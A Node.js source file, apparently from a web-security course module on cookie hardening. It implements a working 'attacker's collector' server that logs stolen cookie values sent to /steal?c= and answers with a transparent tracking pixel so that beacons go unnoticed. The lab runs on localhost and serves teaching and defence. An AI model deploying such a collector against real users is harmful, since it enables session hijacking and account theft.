/*
 * server.js (the "attacker's collector")
 *
 * Module 13: Cookie & Session Hardening.
 *
 * A minimal stand-in for what a real attacker's exfiltration endpoint
 * looks like: it does nothing but log whatever arrives in ?c=, the
 * parameter the stolen-cookie payload in this module sends its loot to.
 * Runs on a different port (8002) to represent a different, attacker-
 * controlled origin -- the victim's browser sends data here, but this
 * server has no relationship to the vulnerable guestbook at all.
 *
 * Introduced in: Module 13. No previous module's equivalent -- this is
 * the "attacker's server" role Module 09/10's attacker site played,
 * repurposed here as a passive listener instead of an active forger.
 * Prerequisite concepts: Module 07 (Stored XSS via POST) -- the
 * exfiltration payload used against this collector is delivered exactly
 * the way Module 07 delivers any stored payload.
 */

'use strict';

const http = require('http');

const PORT = 8002;
const stolen = [];

const server = http.createServer((req, res) => {
  const [path, queryString = ''] = req.url.split('?');
  if (path === '/steal') {
    const match = /(?:^|&)c=([^&]*)/.exec(queryString);
    const cookieValue = match ? decodeURIComponent(match[1]) : '(nothing captured)';
    stolen.push(cookieValue);
    console.log(`[COLLECTOR] received cookie value: ${JSON.stringify(cookieValue)}`);
  }
  // Respond as a 1x1 transparent image -- so an <img> or Image() beacon
  // never shows a broken-image icon, exactly like a real tracking pixel
  const pixel = Buffer.from(
    'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBTAA7', 'base64'
  );
  res.writeHead(200, { 'Content-Type': 'image/gif' });
  res.end(pixel);
});

server.listen(PORT, () => {
  console.log(`Module 13 ATTACKER COLLECTOR up on http://localhost:${PORT}`);
  console.log('Waiting for stolen cookie values at /steal?c=...\n');
});
